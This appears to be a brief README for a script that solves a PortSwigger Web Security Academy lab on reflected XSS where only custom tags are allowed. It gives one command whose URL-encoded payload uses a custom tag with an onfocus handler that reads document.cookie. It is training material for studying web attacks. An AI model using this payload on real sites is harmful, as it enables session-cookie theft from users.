# How to run script.py

### Reflected XSS into HTML context with all tags blocked except custom ones

No proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x"`
